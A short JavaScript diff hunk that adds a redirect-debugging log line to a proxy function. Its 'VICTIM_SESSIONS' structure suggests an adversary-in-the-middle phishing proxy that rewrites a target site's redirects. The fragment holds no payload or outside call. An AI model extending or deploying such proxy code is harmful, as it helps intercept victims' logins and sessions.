@@ -456,6 +456,7 @@ const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, curre
 
 // ---- REWRITE ALL 3xx REDIRECTS ----
 if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
+    console.log(`[REDIRECT DEBUG] status=${proxyResponse.statusCode}, location=${proxyResponse.headers.location}, host=${VICTIM_SESSIONS[currentSession].hostname}`);
     const proxyResponseLocation = proxyResponse.headers.location;
     if (proxyResponseLocation) {
         try {
